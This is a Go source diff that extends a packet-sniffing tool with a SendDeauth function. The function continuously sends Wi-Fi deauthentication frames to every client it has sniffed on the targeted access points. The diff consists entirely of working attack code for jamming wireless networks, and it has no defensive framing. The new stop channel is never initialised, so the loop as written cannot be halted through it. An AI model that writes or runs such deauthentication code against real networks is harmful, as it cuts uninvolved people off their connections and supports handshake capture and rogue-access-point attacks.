@@ -9,20 +9,21 @@ import (
 )
 
 type DataSniffer struct {
-	Sniffed map[string][]net.HardwareAddr
-	Targets []net.HardwareAddr
-	Stop    chan struct{}
-	iface   string
-	myMac   net.HardwareAddr
+	Sniffed    map[string][]net.HardwareAddr
+	Targets    []net.HardwareAddr
+	StopSniff  chan struct{}
+	StopDeauth chan struct{}
+	iface      string
+	myMac      net.HardwareAddr
 }
 
 func NewDataSniffer(iface string, my net.HardwareAddr, targets []net.HardwareAddr) *DataSniffer {
 	return &DataSniffer{
-		Sniffed: make(map[string][]net.HardwareAddr),
-		Targets: targets,
-		Stop:    make(chan struct{}),
-		iface:   iface,
-		myMac:   my,
+		Sniffed:   make(map[string][]net.HardwareAddr),
+		Targets:   targets,
+		StopSniff: make(chan struct{}),
+		iface:     iface,
+		myMac:     my,
 	}
 }
 
@@ -46,7 +47,7 @@ func (s *DataSniffer) handle(handle *pcap.Handle) {
 	for {
 		var packet gopacket.Packet
 		select {
-		case <-s.Stop:
+		case <-s.StopSniff:
 			return
 		case packet = <-pk:
 			s.handlePacket(packet)
@@ -104,6 +105,31 @@ func (s *DataSniffer) Print() {
 			fmt.Printf("\t%s\n", v)
 		}
 		println()
+	}
+}
+
+func (s *DataSniffer) SendDeauth() error {
+	h, err := newHandle(s.iface, true, true)
+	if err != nil {
+		return err
+	}
+	defer h.Close()
+	for {
+		select {
+		case <-s.StopDeauth:
+			return nil
+		default:
+			for _, bssid := range s.Targets {
+				for _, t := range s.Sniffed[bssid.String()] {
+					err = sendDeauth(h, t, bssid, bssid)
+					if err == nil {
+						fmt.Printf("sent to %s...\n", t.String())
+					} else {
+						fmt.Printf("error with %v\n", err)
+					}
+				}
+			}
+		}
 	}
 }
 
